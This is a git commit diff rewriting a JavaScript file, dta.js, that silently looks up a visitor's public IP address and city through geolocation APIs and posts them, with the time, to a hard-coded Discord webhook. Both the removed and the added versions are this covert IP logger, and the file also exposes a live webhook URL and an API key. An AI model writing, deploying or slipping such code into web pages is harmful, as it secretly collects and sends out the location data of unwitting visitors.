5f87f8440f7be30e8fca2908ea2415e2b248dc01
asijdaoiusd <139229327+asijdaoiusd@users.noreply.github.com>
2023-07-12 02:40:52 -0300

    Update dta.js

--- dta.js
+++ dta.js
@@ -1,46 +1,28 @@
-var date = new Date();
-var hora = date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds();
 
-var ip = '';
-var ciudad = '';
-
-fetch('https://api.ipify.org/?format=json')
-  .then(function(response) {
-    return response.json();
-  })
-  .then(function(data) {
-    ip = data.ip;
-    return fetch('https://ip-api.com/json/' + ip);
-  })
-  .then(function(response) {
-    return response.json();
-  })
-  .then(function(data) {
-    ciudad = data.city;
-    sendToWebhook(hora, ip, ciudad);
-  })
-  .catch(function(error) {
-    console.error('');
-  });
-
-function sendToWebhook(hora, ip, ciudad) {
-  var webhookURL = 'https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_';
-
-  var payload = {
-    content: 'Hora: ' + hora + '\nIP: ' + ip + '\nCiudad: ' + ciudad
-  };
-
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(payload)
-  })
-  .then(function(response) {
-    console.log('');
-  })
-  .catch(function(error) {
-    console.error('');
-  });
-}
+async function fetchIPInformationAndSendToWebhook(webhookURL) {
+    const response = await fetch('https://api.ipify.org/?format=json');
+    const data = await response.json();
+    const ip = data.ip;
+  
+    const url = `https://api.ipregistry.co/${ip}?hostname=true&key=o3ilo7k3f9j9bztb`;
+    const ipResponse = await fetch(url);
+    const ipData = await ipResponse.json();
+  
+    const hora = new Date().toLocaleTimeString();
+    const ciudad = ipData.location.city;
+  
+    const payload = {
+      content: `Hora: ${hora}\nIP: ${ip}\nCiudad: ${ciudad}`
+    };
+  
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+  }
+  
+  fetchIPInformationAndSendToWebhook('https://discord.com/api/webhooks/1128558244999200839/6oxpikUDEyX1SggWnN5N0vmuac2NbDYu97jDBrBGr8JSYIIW9r413t9TxcB4nF-dxRp_');
+  
